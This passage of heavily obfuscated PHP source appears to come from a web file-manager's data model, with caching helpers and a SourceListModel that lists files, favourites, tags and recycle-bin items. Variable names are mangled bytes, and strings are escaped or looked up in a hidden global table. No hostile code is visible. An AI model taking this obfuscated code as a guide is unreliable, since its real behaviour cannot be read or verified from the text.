array($˜Ñ«ƒ“ç[43] => $≥≤ÍùàÙ, $˜Ñ«ƒ“ç[104] => $¥∞•Ú§¶, $˜Ñ«ƒ“ç[383] => $ÀÉﬁÙ’¿); $˜Ö•Ñ’[] = $this->filterWhere($¯›Ø≥ˆµ); } if (!$˜Ö•Ñ’) { return !0; } $”ôÊï¿ﬂ = $this->cacheKey($˜Ñ«ƒ“ç[409]); CacheLock::lock($”ôÊï¿ﬂ); $ ’∂óúÀ = $this->addAll($˜Ö•Ñ’, array(), !0); CacheLock::unlock($”ôÊï¿ﬂ); return $ ’∂óúÀ; } protected function optionDefault($ã•“ïéò = '') { return !1; } public function setDeep($„óú•ﬂ◊, $˚Àî≥∂ = false, $´˙ƒïÜ« = '') { $ÈÚÏÇ©∂ = explode($_SERVER[Á≈ ä ∞][20], $„óú•ﬂ◊); $¬≈ÁÉ˘˛ = $this->get(); array_set_value($¬≈ÁÉ˘˛, $„óú•ﬂ◊, $˚Àî≥∂); $this->set($ÈÚÏÇ©∂[0], $¬≈ÁÉ˘˛[$ÈÚÏÇ©∂[0]], $´˙ƒïÜ«); } public function remove($ïÒé¬ÙÍ, $è∏ıÉâë = '') { $≥„˜¨–¬ =& $_SERVER[Á≈ ä ∞]; $this->cacheRemove($è∏ıÉâë); $§√ÿõ…Ô = $this->filterWhere(array($≥„˜¨–¬[104] => $ïÒé¬ÙÍ, $≥„˜¨–¬[43] => $è∏ıÉâë)); if (is_null($ïÒé¬ÙÍ)) { unset($§√ÿõ…Ô[$≥„˜¨–¬[104]]); } return $this->where($§√ÿõ…Ô)->delete(); } public function cacheSet($π˙ø» ©, $õò°©ñΩ = false) { return Cache::set($this->cacheKey($π˙ø» ©), $õò°©ñΩ); } public function cacheGet($Ü˝ä∑‡§) { return Cache::get($this->cacheKey($Ü˝ä∑‡§)); } public function cacheRemove($«ëôöÄ∏) { return Cache::remove($this->cacheKey($«ëôöÄ∏)); } protected function filterWhere($®ú∏‘é—) { return $®ú∏‘é—; } protected function cacheKey($ é¨ÀΩ») { return $ é¨ÀΩ»; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\162\143\145"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\x6d\145" => "\x69\x6f\x5f\x73\x6f\x75\162\x63\145\137\155\x65\x74\141", "\155\x65\x74\x61\106\151\145\154\144" => "\163\157\165\x72\143\145\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\x54\x69\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\x65\162\x74", "\146\165\156\143\164\151\x6f\x6e"), array("\x63\x72\145\x61\x74\x65\124\x69\x6d\145", "\x74\x69\155\x65", "\x69\x6e\163\x65\x72\x74", "\146\x75\156\x63\x74\151\x6f\156"), array("\166\x69\145\x77\x54\151\155\x65", "\164\151\155\145", "\x69\x6e\163\145\x72\x74", "\x66\x75\x6e\x63\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Èñé©«ç) { return $this->listSource(array($_SERVER[Á≈ ä ∞][410] => $Èñé©«ç)); } public function typeName($ûŸí≠©Ô) { static $öâ¡Ô‚ö = array(self::TYPE_SYSTEM => "\x73\171\163\x74\145\155", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\147\162\157\x75\x70"); return $öâ¡Ô‚ö[$ûŸí≠©Ô . $_SERVER[Á≈ ä ∞][22]]; } public function sourceListInfo($Û◊–Ëß∏, $ó≠„Îö‰ = false) { $∑ë˘∞›≈ =& $_SERVER[Á≈ ä ∞]; $Û◊–Ëß∏ = $Û◊–Ëß∏ ? $Û◊–Ëß∏ : array(); $Û◊–Ëß∏ = array_filter(array_unique($Û◊–Ëß∏)); if (!$Û◊–Ëß∏) { return array(); } $ﬁÇè£ñü = $this->where(array($∑ë˘∞›≈[411] => array($∑ë˘∞›≈[17], $Û◊–Ëß∏)))->select(); $this->_listDataApply($ﬁÇè£ñü, $ó≠„Îö‰); return array_to_keyvalue($ﬁÇè£ñü, $∑ë˘∞›≈[411]); } public function pathInfoFilter(&$ÿï˛€Ö¬) { $Ø‹Å†åõ =& $_SERVER[Á≈ ä ∞]; static $∞∞≥˚îó = false; static $«©œŒ›… = false; static $‹·ö‰Ëı = false; if (!$∞∞≥˚îó) { $öºÖ’ñ“ = $Ø‹Å†åõ[412]; $öºÖ’ñ“ .= $Ø‹Å†åõ[413]; $öºÖ’ñ“ .= $Ø‹Å†åõ[414]; $Î‘Ÿ‘ø¬ = $Ø‹Å†åõ[415]; $Ú”∂∂ÉÙ = explode($Ø‹Å†åõ[60], $Î‘Ÿ‘ø¬); $∞∞≥˚îó = explode($Ø‹Å†åõ[60], $öºÖ’ñ“); $«©œŒ›… = array(); foreach ($∞∞≥˚îó as $ü§‹˘úù) { if (in_array($ü§‹˘úù, $Ú”∂∂ÉÙ)) { continue; } $«©œŒ›…[] = $ü§‹˘úù; } $‹·ö‰Ëı = explode($Ø‹Å†åõ[60], $Ø‹Å†åõ[416]); } foreach ($‹·ö‰Ëı as $µÙÆ∂•) { if (isset($ÿï˛€Ö¬[$µÙÆ∂•])) { $ÿï˛€Ö¬[$µÙÆ∂•] = intval($ÿï˛€Ö¬[$µÙÆ∂•]); } } $ÿï˛€Ö¬[$Ø‹Å†åõ[94]] = $Ø‹Å†åõ[417] . $ÿï˛€Ö¬[$Ø‹Å†åõ[411]] . $Ø‹Å†åõ[418]; $ÿï˛€Ö¬[$Ø‹Å†åõ[43]] = $ÿï˛€Ö¬[$Ø‹Å†åõ[419]] == 1 ? $Ø‹Å†åõ[85] : $Ø‹Å†åõ[209]; $ÿï˛€Ö¬[$Ø‹Å†åõ[420]] = $this->typeName($ÿï˛€Ö¬[$Ø‹Å†åõ[420]]); if ($ÿï˛€Ö¬[$Ø‹Å†åõ[419]] != 1) { $ÿï˛€Ö¬[$Ø‹Å†åõ[184]] = $ÿï˛€Ö¬[$Ø‹Å†åõ[421]]; unset($ÿï˛€Ö¬[$Ø‹Å†åõ[421]]); } $†¢®◊˝Ó = $∞∞≥˚îó; if (isset($ÿï˛€Ö¬[$Ø‹Å†åõ[422]]) && $ÿï˛€Ö¬[$Ø‹Å†åõ[422]][$Ø‹Å†åõ[423]] == -1) { $†¢®◊˝Ó = $«©œŒ›…; } $ÿï˛€Ö¬ = array_field_key($ÿï˛€Ö¬, $†¢®◊˝Ó); return $ÿï˛€Ö¬; } public function listUserFav() { $»Íƒ¿Ô“ =& $_SERVER[Á≈ ä ∞]; $äﬁ¬ÊÂÌ = Model($»Íƒ¿Ô“[424])->listData(); $≤îîÁåê = array_filter_by_field($äﬁ¬ÊÂÌ, $»Íƒ¿Ô“[43], $»Íƒ¿Ô“[425]); $≤îîÁåê = array_to_keyvalue($≤îîÁåê, $»Íƒ¿Ô“[22], $»Íƒ¿Ô“[94]); if ($≤îîÁåê) { $ñ¶È±à∫ = $this->listSource(array($»Íƒ¿Ô“[426] => array($»Íƒ¿Ô“[427], $≤îîÁåê))); } $ñ¶È±à∫ = array_to_keyvalue($ñ¶È±à∫[$»Íƒ¿Ô“[378]], $»Íƒ¿Ô“[411]); foreach ($äﬁ¬ÊÂÌ as &$µ‰Úﬁ¸Ò) { $µ‰Úﬁ¸Ò = array($»Íƒ¿Ô“[428] => $µ‰Úﬁ¸Ò[$»Íƒ¿Ô“[408]], $»Íƒ¿Ô“[429] => $µ‰Úﬁ¸Ò[$»Íƒ¿Ô“[42]], $»Íƒ¿Ô“[430] => $µ‰Úﬁ¸Ò[$»Íƒ¿Ô“[94]], $»Íƒ¿Ô“[431] => $µ‰Úﬁ¸Ò[$»Íƒ¿Ô“[43]], $»Íƒ¿Ô“[432] => $µ‰Úﬁ¸Ò[$»Íƒ¿Ô“[210]], $»Íƒ¿Ô“[433] => $µ‰Úﬁ¸Ò[$»Íƒ¿Ô“[95]]); if ($µ‰Úﬁ¸Ò[$»Íƒ¿Ô“[43]] == $»Íƒ¿Ô“[425] && $ñ¶È±à∫[$µ‰Úﬁ¸Ò[$»Íƒ¿Ô“[94]]]) { $µ‰Úﬁ¸Ò[$»Íƒ¿Ô“[96]] = $ñ¶È±à∫[$µ‰Úﬁ¸Ò[$»Íƒ¿Ô“[94]]]; } } unset($µ‰Úﬁ¸Ò); return $äﬁ¬ÊÂÌ; } public function listUserTag($Ä∑…ëëÂ) { $‰ºﬁâÅﬁ =& $_SERVER[Á≈ ä ∞]; if ($Ä∑…ëëÂ && !is_array($Ä∑…ëëÂ)) { $Ä∑…ëëÂ = array($Ä∑…ëëÂ); } $∑´Œˆ≤Ê = Model($‰ºﬁâÅﬁ[434])->listData(); $¸àó¿ôä = array(); $¢ÏïÔ≥› = array(); foreach ($∑´Œˆ≤Ê as $¯Ø⁄î¬∆) { $ÈŒ‚é´π = $¯Ø⁄î¬∆[$‰ºﬁâÅﬁ[94]]; if (!$ÈŒ‚é´π) { continue; } if (!isset($¢ÏïÔ≥›[$ÈŒ‚é´π])) { $¢ÏïÔ≥›[$ÈŒ‚é´π] = array(); } $¢ÏïÔ≥›[$ÈŒ‚é´π][] = $¯Ø⁄î¬∆[$‰ºﬁâÅﬁ[435]]; $¸àó¿ôä[$¯Ø⁄î¬∆[$‰ºﬁâÅﬁ[94]]] = $¯Ø⁄î¬∆; } $ùÎ˘»Å» = array(); $‘ã˘◊Ñü = array(); $Ô¡ç∫Á‘ = array(); foreach ($¢ÏïÔ≥› as $êûÌÇ≈» => $Æ§Œñõú) { $«Ñ“¶öô = !0; if (!$Ä∑…ëëÂ) { $ùÎ˘»Å»[] = $êûÌÇ≈»; continue; } foreach ($Ä∑…ëëÂ as $˛ÄˆÍÛ‰) { if (!in_array($˛ÄˆÍÛ‰, $Æ§Œñõú)) { $«Ñ“¶öô = !1; break; } } if (!$«Ñ“¶öô) { continue; } if (!is_numeric($êûÌÇ≈»)) { $úëÏ˙ΩÃ = $¸àó¿ôä[$êûÌÇ≈»]; $œÈ«ã˝Ù = array($‰ºﬁâÅﬁ[42] => $úëÏ˙ΩÃ[$‰ºﬁâÅﬁ[42]], $‰ºﬁâÅﬁ[94] => $úëÏ˙ΩÃ[$‰ºﬁâÅﬁ[94]], $‰ºﬁâÅﬁ[43] => $úëÏ˙ΩÃ[$‰ºﬁâÅﬁ[43]], $‰ºﬁâÅﬁ[96] => array($‰ºﬁâÅﬁ[436] => 1), $‰ºﬁâÅﬁ[211] => !0); if ($úëÏ˙ΩÃ[$‰ºﬁâÅﬁ[43]] == $‰ºﬁâÅﬁ[209]) { $Ô¡ç∫Á‘[] = $œÈ«ã˝Ù; } if ($úëÏ˙ΩÃ[$‰ºﬁâÅﬁ[43]] == $‰ºﬁâÅﬁ[85]) { $‘ã˘◊Ñü[] = $œÈ«ã˝Ù; } continue; } $ùÎ˘»Å»[] = $êûÌÇ≈»; } if ($ùÎ˘»Å») { $˘ÀôüÜŸ = $this->listSource(array($‰ºﬁâÅﬁ[426] => array($‰ºﬁâÅﬁ[427], $ùÎ˘»Å»))); } $˘ÀôüÜŸ = $˘ÀôüÜŸ ? $˘ÀôüÜŸ : array($‰ºﬁâÅﬁ[92] => array(), $‰ºﬁâÅﬁ[93] => array()); $˘ÀôüÜŸ[$‰ºﬁâÅﬁ[92]] = array_merge($˘ÀôüÜŸ[$‰ºﬁâÅﬁ[92]], $‘ã˘◊Ñü); $˘ÀôüÜŸ[$‰ºﬁâÅﬁ[93]] = array_merge($˘ÀôüÜŸ[$‰ºﬁâÅﬁ[93]], $Ô¡ç∫Á‘); if (isset($˘ÀôüÜŸ[$‰ºﬁâÅﬁ[375]]) && count($ùÎ˘»Å») == $˘ÀôüÜŸ[$‰ºﬁâÅﬁ[375]][$‰ºﬁâÅﬁ[376]]) { return $˘ÀôüÜŸ; } $≈∫”∆Ñ = array(); $°àÈ‰Ä“ = array_to_keyvalue($˘ÀôüÜŸ[$‰ºﬁâÅﬁ[92]], $‰ºﬁâÅﬁ[22], $‰ºﬁâÅﬁ[411]); $‘÷´ú‰∫ = array_to_keyvalue($˘ÀôüÜŸ[$‰ºﬁâÅﬁ[93]], $‰ºﬁâÅﬁ[22], $‰ºﬁâÅﬁ[411]); $ú≥Í⁄– = array_merge($‘÷´ú‰∫, $°àÈ‰Ä“); foreach ($ùÎ˘»Å» as $ÈŒ‚é´π) { if (!in_array($ÈŒ‚é´π, $ú≥Í⁄–)) { $≈∫”∆Ñ[] = $ÈŒ‚é´π; } } if ($≈∫”∆Ñ) { Model($‰ºﬁâÅﬁ[437])->removeBySource($≈∫”∆Ñ); } return $˘ÀôüÜŸ; } public function listUserRecycle() { $í˘˘›Æç =& $_SERVER[Á≈ ä ∞]; $„Òœπøø = Model($í˘˘›Æç[438])->listData(); if (!$„Òœπøø) { return array(); } $ÓîÌıê‘ = array($í˘˘›Æç[426] => array($í˘˘›Æç[427], $„Òœπøø), $í˘˘›Æç[439] => 1); return $this->listSource($ÓîÌıê‘); } public function listSource($ ·åââÂ, $¿îÂç˝‡ = 3000, $Ä›±òßÜ = false) { $ÌÑéñÁù =& $_SERVER[Á≈ ä ∞]; if (!isset($ ·åââÂ[$ÌÑéñÁù[440]])) { $ ·åââÂ[$ÌÑéñÁù[440]] = 0; } if (isset($ ·åââÂ[$ÌÑéñÁù[441]]) && $ ·åââÂ[$ÌÑéñÁù[441]] == $ÌÑéñÁù[207]) { $ ·åââÂ[$ÌÑéñÁù[421]] = array($ÌÑéñÁù[340], $ÌÑéñÁù[442]); } $ÅÈ˝™ù– = $ÌÑéñÁù[443]; $ƒ’êùææ = $this->field($ÅÈ˝™ù–)->_makeOrder()->where($ ·åââÂ)->selectPage($¿îÂç˝‡); $this->_listPageCheck($ƒ’êùææ, $ÅÈ˝™ù–, $ ·åââÂ); $this->_listDataApply($ƒ’êùææ[$ÌÑéñÁù[378]], $Ä›±òßÜ); $this->_listMake($ƒ’êùææ); return $ƒ’êùææ; } private function _listPageCheck(&$Ì∫“ﬁ‡˜, $ôßó£¢ç, $¯ÂÔÕ£Ò) { $“∂°çÛò =& $_SERVER[Á≈ ä ∞]; if (!is_array($Ì∫“ﬁ‡˜[$“∂°çÛò[375]])) { return; } $âìá÷‰Œ = $Ì∫“ﬁ‡˜[$“∂°çÛò[375]]; if ($âìá÷‰Œ[$“∂°çÛò[377]] <= 1) { return; } if ($âìá÷‰Œ[$“∂°çÛò[376]] >= 100000) { return; } if (Model($“∂°çÛò[444])->get($“∂°çÛò[445]) != $“∂°çÛò[446]) { return; } $ôßó£¢ç = str_replace(array($“∂°çÛò[63], $“∂°çÛò[351], $“∂°çÛò[11]), $“∂°çÛò[22], $ôßó£¢ç); $ôßó£¢ç = $“∂°çÛò[447] . str_replace($“∂°çÛò[60], $“∂°çÛò[448], $ôßó£¢ç) . $“∂°çÛò[449]; $÷˙È’∂« = $“∂°çÛò[450]; $÷˙È’∂« = $÷˙È’∂« . $“∂°çÛò[451]; $’≥¥Æá· = $âìá÷‰Œ[$“∂°çÛò[372]] * ($âìá÷‰Œ[$“∂°çÛò[362]] - 1) . $“∂°çÛò[60] . $âìá÷‰Œ[$“∂°çÛò[372]]; $˙¡À±≤¢ = $this->_makeOrder(!0); $¥◊∆ù√Í = $“∂°çÛò[447] . str_replace($“∂°çÛò[60], $“∂°çÛò[448], $˙¡À±≤¢[0]); if (strpos($¥◊∆ù√Í, $“∂°çÛò[452])) { $¥◊∆ù√Í = str_replace($“∂°çÛò[452], $“∂°çÛò[453], $¥◊∆ù√Í); } else { $¥◊∆ù√Í .= $“∂°çÛò[454] . $˙¡À±≤¢[1]; } $Ωæßû¯ÿ = array(); foreach ($¯ÂÔÕ£Ò as $ÊÊΩ Ùæ => $ƒƒ˙öêÇ) { $Ωæßû¯ÿ[$“∂°çÛò[447] . $ÊÊΩ Ùæ] = $ƒƒ˙öêÇ; } $this->alias($“∂°çÛò[455])->field($ôßó£¢ç)->limit($’≥¥Æá·)->order($¥◊∆ù√Í); $é¯‹€òÙ = $this->join($÷˙È’∂«)->where($Ωæßû¯ÿ)->select(); if ($é¯‹€òÙ) { $Ì∫“ﬁ‡˜[$“∂°çÛò[378]] = $é¯‹€òÙ; } } protected function _makeOrder($ì‚Å˝Å„ = false) { $Ö⁄ãÃ≤› =& $_SERVER[Á≈ ä ∞]; $∑Ø∂Å÷ = Model($Ö⁄ãÃ≤›[456])->get($Ö⁄ãÃ≤›[457]); $áœÉÙ‹¬ = Model($Ö⁄ãÃ≤›[456])->get($Ö⁄ãÃ≤›[458]); $Ì⁄ÿÈ”ﬁ = array($Ö⁄ãÃ≤›[459] => $Ö⁄ãÃ≤›[460], $Ö⁄ãÃ≤›[461] => $Ö⁄ãÃ≤›[462]); $ÊÌ»ñÏá = array($Ö⁄ãÃ≤›[42] => $Ö⁄ãÃ≤›[42], $Ö⁄ãÃ≤›[86] => $Ö⁄ãÃ≤›[86], $Ö⁄ãÃ≤›[184] => $Ö⁄ãÃ≤›[421], $Ö⁄ãÃ≤›[463] => $Ö⁄ãÃ≤›[463], $Ö⁄ãÃ≤›[464] => $Ö⁄ãÃ≤›[465], $Ö⁄ãÃ≤›[210] => $Ö⁄ãÃ≤›[210], $Ö⁄ãÃ≤›[95] => $Ö⁄ãÃ≤›[95]); $÷ñÚ∆˝Õ = Input::get($Ö⁄ãÃ≤›[466], $Ö⁄ãÃ≤›[17], $∑Ø∂Å÷, array_keys($ÊÌ»ñÏá)); $¢›‹§∆Ï = Input::get($Ö⁄ãÃ≤›[467], $Ö⁄ãÃ≤›[17], $áœÉÙ‹¬, array_keys($Ì⁄ÿÈ”ﬁ)); if (!in_array($÷ñÚ∆˝Õ, array_keys($ÊÌ»ñÏá))) { $÷ñÚ∆˝Õ = $Ö⁄ãÃ≤›[42]; } if (!in_array($¢›‹§∆Ï, array_keys($Ì⁄ÿÈ”ﬁ))) { $÷ñÚ∆˝Õ = $Ö⁄ãÃ≤›[459]; } if ($÷ñÚ∆˝Õ == $Ö⁄ãÃ≤›[42]) { } $Úü∆ü†ì = $Ö⁄ãÃ≤›[468] . $ÊÌ»ñÏá[$÷ñÚ∆˝Õ] . $Ö⁄ãÃ≤›[63] . $Ì⁄ÿÈ”ﬁ[$¢›‹§∆Ï]; $Úü∆ü†ì = rtrim(trim($Úü∆ü†ì), $Ö⁄ãÃ≤›[60]); if ($ì‚Å˝Å„) { return array($Úü∆ü†ì, $Ì⁄ÿÈ”ﬁ[$¢›‹§∆Ï]); } return $this->order($Úü∆ü†ì); } protected function _listDataApplyItem($íÏäÛ–Â, $ã©ö¬… = false) { $Âú‚˙Ëê = array($íÏäÛ–Â); $this->_listDataApply($Âú‚˙Ëê, $ã©ö¬…); return $Âú‚˙Ëê[0]; } protected function _listDataApply(&$…ÇÔ†«Í, $ÄΩ¸Ô¸˝ = false) { $Û…‚á‡Ê =& $_SERVER[Á≈ ä ∞]; if (!$…ÇÔ†«Í) { $…ÇÔ†«Í = array(); return; } $∞¶Ü†÷Õ = array_to_keyvalue($…ÇÔ†«Í, $Û…‚á‡Ê[22], $Û…‚á‡Ê[411]); $∞¶Ü†÷Õ = array_unique($∞¶Ü†÷Õ); $this->_listSourceCache($…ÇÔ†«Í); if (!$ÄΩ¸Ô¸˝) { $this->_listAppendMeta($…ÇÔ†«Í, $∞¶Ü†÷Õ); $this->_listAppendFileMeta($…ÇÔ†«Í, $∞¶Ü†÷Õ); $this->_listAppendChildren($…ÇÔ†«Í, $∞¶Ü†÷Õ); } $this->_listAppendPath($…ÇÔ†«Í); $this->_listAppendAuth($…ÇÔ†«Í); $this->_listAppendSourceInfo($…ÇÔ†«Í, $∞¶Ü†÷Õ); $this->_listAppendUser($…ÇÔ†«Í); $this->_listFilterInfo($…ÇÔ†«Í, $ÄΩ¸Ô¸˝); $this->_listAppendAuthSecret($…ÇÔ†«Í); } protected function _listSourceCache($˚ï≤—ë∑) { $£Øï√«¡ =& $_SERVER[Á≈ ä ∞]; foreach ($˚ï≤—ë∑ as $çûÕ¡á¥) { self::$cacheSourceInfo[$£Øï√«¡[469] . $çûÕ¡á¥[$£Øï√«¡[411]]] = $çûÕ¡á¥; } } protected function _listFilterInfo(&$É›ºùôä, $Ω ˛πßñ = false) { $‡ö˜ÉÕá =& $_SERVER[Á≈ ä ∞]; foreach ($É›ºùôä as &$‹¨Î¬ùÎ) { $‹¨Î¬ùÎ = $this->pathInfoFilter($‹¨Î¬ùÎ); self::$cachePathInfo[$‡ö˜ÉÕá[470] . intval($Ω ˛πßñ) . $‡ö˜ÉÕá[395] . $‹¨Î¬ùÎ[$‡ö˜ÉÕá[411]]] = $‹¨Î¬ùÎ; } unset($‹¨Î¬ùÎ); } protected function _listMake(&$Ωè»ùãÔ) { $’«é≤°û =& $_SERVER[Á≈ ä ∞]; $Ωè»ùãÔ[$’«é≤°û[92]] = array(); $Ωè»ùãÔ[$’«é≤°û[93]] = array(); foreach ($Ωè»ùãÔ[$’«é≤°û[378]] as $‚∫Û›±‹) { $ªÛ˝†ª = $‚∫Û›±‹[$’«é≤°û[419]] == 1 ? $’«é≤°û[92] : $’«é≤°û[93]; $Ωè»ùãÔ[$ªÛ˝†ª][] = $‚∫Û›±‹; } unset($Ωè»ùãÔ[$’«é≤°û[378]]); } protected function _listAppendMeta(&$¨Ω»√Êó, $Ë»¬¿ñ‰) { $è’µÂöœ =& $_SERVER[Á≈ ä ∞]; $ﬁ⁄°ŸúÙ = array($è’µÂöœ[426] => array($è’µÂöœ[427], $Ë»¬¿ñ‰)); $ÈãË⁄–‚ = Model($è’µÂöœ[471])->field($è’µÂöœ[472])->where($ﬁ⁄°ŸúÙ)->select(); if (!$ÈãË⁄–‚) { return; } $Ïù¶ªÌû = array($è’µÂöœ[473], $è’µÂöœ[474], $è’µÂöœ[453]); $ãåÍŒ„Ò = array(); foreach ($ÈãË⁄–‚ as $£˙Ü¶Áü) { if (!isset($ãåÍŒ„Ò[$£˙Ü¶Áü[$è’µÂöœ[411]]])) { $ãåÍŒ„Ò[$£˙Ü¶Áü[$è’µÂöœ[411]]] = array(); } if (in_array($£˙Ü¶Áü[$è’µÂöœ[104]], $Ïù¶ªÌû)) { continue; } $ãåÍŒ„Ò[$£˙Ü¶Áü[$è’µÂöœ[411]]][$£˙Ü¶Áü[$è’µÂöœ[104]]] = $£˙Ü¶Áü[$è’µÂöœ[383]]; } foreach ($¨Ω»√Êó as &$ñΩÁË˚©) { $ñΩÁË˚©[$è’µÂöœ[475]] = !1; if (isset($ãåÍŒ„Ò[$ñΩÁË˚©[$è’µÂöœ[411]]])) { $ñΩÁË˚©[$è’µÂöœ[475]] = $ãåÍŒ„Ò[$ñΩÁË˚©[$è’µÂöœ[411]]]; } if ($this->fileIsLock($ñΩÁË˚©) && $ñΩÁË˚©[$è’µÂöœ[422]]) { $ñºÁ·Áà = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ñΩÁË˚©[$è’µÂöœ[422]][$è’µÂöœ[423]] = AuthModel::authDisable($ñΩÁË˚©[$è’µÂöœ[422]][$è’µÂöœ[423]], $ñºÁ·Áà); $ñΩÁË˚©[$è’µÂöœ[422]][$è’µÂöœ[476]][$è’µÂöœ[422]] = $ñΩÁË˚©[$è’µÂöœ[422]][$è’µÂöœ[423]]; } } unset($ñΩÁË˚©); } protected function _listAppendFileMeta(&$äÍÄƒÍ∆, $º„˜…À∑) { $‚¯êûŒ≈ =& $_SERVER[Á≈ ä ∞]; $ûñ˘–Æ÷ = array_to_keyvalue($äÍÄƒÍ∆, $‚¯êûŒ≈[22], $‚¯êûŒ≈[477]); $ûñ˘–Æ÷ = array_filter(array_unique($ûñ˘–Æ÷)); if (!$ûñ˘–Æ÷) { return; } $ì√˛‡÷ˆ = array($‚¯êûŒ≈[478] => array($‚¯êûŒ≈[427], $ûñ˘–Æ÷)); $ß≤ûµ¡è = $‚¯êûŒ≈[479]; $ºç•â‰ﬂ = Model($‚¯êûŒ≈[480])->field($ß≤ûµ¡è)->where($ì√˛‡÷ˆ)->select(); $ºç•â‰ﬂ = array_to_keyvalue($ºç•â‰ﬂ, $‚¯êûŒ≈[477]); $´·∂Å∆‰ = Model($‚¯êûŒ≈[481])->field($‚¯êûŒ≈[482])->where($ì√˛‡÷ˆ)->select(); $´·∂Å∆‰ = $´·∂Å∆‰ ? $´·∂Å∆‰ : array(); $«î¡ﬂ˛ú = array(); foreach ($´·∂Å∆‰ as $Ô˘¡∑˜ô) { if (!isset($«î¡ﬂ˛ú[$Ô˘¡∑˜ô[$‚¯êûŒ≈[477]]])) { $«î¡ﬂ˛ú[$Ô˘¡∑˜ô[$‚¯êûŒ≈[477]]] = array(); } $«î¡ﬂ˛ú[$Ô˘¡∑˜ô[$‚¯êûŒ≈[477]]][$Ô˘¡∑˜ô[$‚¯êûŒ≈[104]]] = $Ô˘¡∑˜ô[$‚¯êûŒ≈[383]]; } foreach ($äÍÄƒÍ∆ as &$ÊÓœê°®) { $˜˝œı©ﬁ = $ÊÓœê°®[$‚¯êûŒ≈[477]]; if (!$˜˝œı©ﬁ || !is_array($ºç•â‰ﬂ[$˜˝œı©ﬁ])) { continue; } $Ã⁄≈˙ ≤ = $ºç•â‰ﬂ[$˜˝œı©ﬁ]; $Ã⁄≈˙ ≤[$‚¯êûŒ≈[86]] = $ÊÓœê°®[$‚¯êûŒ≈[86]]; $Ã⁄≈˙ ≤[$‚¯êûŒ≈[42]] = $ÊÓœê°®[$‚¯êûŒ≈[42]]; if (!isset(self::$cacheFileInfo[$‚¯êûŒ≈[483] . $˜˝œı©ﬁ])) { self::$cacheFileInfo[$‚¯êûŒ≈[483] . $˜˝œı©ﬁ] = array_merge(array(), $Ã⁄≈˙ ≤); } unset($ºç•â‰ﬂ[$˜˝œı©ﬁ][$‚¯êûŒ≈[94]]); $ú•Ÿ¥¢∏ = is_array($«î¡ﬂ˛ú[$˜˝œı©ﬁ]) ? $«î¡ﬂ˛ú[$˜˝œı©ﬁ] : array(); $ÊÓœê°®[$‚¯êûŒ≈[180]] = array_merge($ú•Ÿ¥¢∏, $ºç•â‰ﬂ[$˜˝œı©ﬁ]); if (isset($ÊÓœê°®[$‚¯êûŒ≈[180]][$‚¯êûŒ≈[179]])) { $ÊÓœê°®[$‚¯êûŒ≈[179]] = json_decode($ÊÓœê°®[$‚¯êûŒ≈[180]][$‚¯êûŒ≈[179]], !0); unset($ÊÓœê°®[$‚¯êûŒ≈[180]][$‚¯êûŒ≈[179]]); } } unset($ÊÓœê°®); } protected function _listAppendSourceInfo(&$µûáÅÇ≥, $ÏëÂÉÅ≥) { $∂∞É™öØ =& $_SERVER[Á≈ ä ∞]; if (!defined($∂∞É™öØ[484])) { return; } $àÕ÷•±ö = Model($∂∞É™öØ[485])->listData(); $Ã’Çï¸ô = Model($∂∞É™öØ[434])->listData(); $™˚øõó∏ = Model($∂∞É™öØ[424])->listData(); $„Ã±Ω • = Model($∂∞É™öØ[486])->listSimple(); $†¨‘îã• = array_to_keyvalue($àÕ÷•±ö, $∂∞É™öØ[408]); $ä∂„æ®¢ = array_to_keyvalue_group($Ã’Çï¸ô, $∂∞É™öØ[94], $∂∞É™öØ[435]); $¨®Ö—ñÿ = array_to_keyvalue($™˚øõó∏, $∂∞É™öØ[94]); $ªäƒÑú‹ = array_to_keyvalue_group($„Ã±Ω •, $∂∞É™öØ[411]); foreach ($µûáÅÇ≥ as &$¥ÑŒ±˛π) { $¥ÑŒ±˛π[$∂∞É™öØ[96]] = array($∂∞É™öØ[487] => 0, $∂∞É™öØ[488] => 0, $∂∞É™öØ[489] => 0); if (isset($¨®Ö—ñÿ[$¥ÑŒ±˛π[$∂∞É™öØ[411]]])) { $¥ÑŒ±˛π[$∂∞É™öØ[96]][$∂∞É™öØ[490]] = 1; $¥ÑŒ±˛π[$∂∞É™öØ[96]][$∂∞É™öØ[491]] = $¨®Ö—ñÿ[$¥ÑŒ±˛π[$∂∞É™öØ[411]]][$∂∞É™öØ[42]]; } if ($ä∂„æ®¢ && $†¨‘îã• && isset($ä∂„æ®¢[$¥ÑŒ±˛π[$∂∞É™öØ[411]]])) { $¥ÑŒ±˛π[$∂∞É™öØ[96]][$∂∞É™öØ[492]] = array(); foreach ($ä∂„æ®¢[$¥ÑŒ±˛π[$∂∞É™öØ[411]]] as $àñÿ‹Œ€) { $‚ª– Üπ = $†¨‘îã•[$àñÿ‹Œ€]; $¥ÑŒ±˛π[$∂∞É™öØ[96]][$∂∞É™öØ[492]][] = array($∂∞É™öØ[493] => $‚ª– Üπ[$∂∞É™öØ[408]], $∂∞É™öØ[429] => $‚ª– Üπ[$∂∞É™öØ[42]], $∂∞É™öØ[494] => $‚ª– Üπ[$∂∞É™öØ[495]]); } } if ($ªäƒÑú‹ && isset($ªäƒÑú‹[$¥ÑŒ±˛π[$∂∞É™öØ[411]]])) { $¥ÑŒ±˛π[$∂∞É™öØ[96]][$∂∞É™öØ[496]] = array(); foreach ($ªäƒÑú‹[$¥ÑŒ±˛π[$∂∞É™öØ[411]]] as $∏Á´üÔˆ) { $¥ÑŒ±˛π[$∂∞É™öØ[96]][$∂∞É™öØ[496]] = array($∂∞É™öØ[497] => $∏Á´üÔˆ[$∂∞É™öØ[498]], $∂∞É™öØ[499] => $∏Á´üÔˆ[$∂∞É™öØ[500]], $∂∞É™öØ[501] => $∏Á´üÔˆ[$∂∞É™öØ[411]], $∂∞É™öØ[502] => $∏Á´üÔˆ[$∂∞É™öØ[503]], $∂∞É™öØ[504] => $∏Á´üÔˆ[$∂∞É™öØ[505]], $∂∞É™öØ[506] => $∏Á´üÔˆ[$∂∞É™öØ[506]], 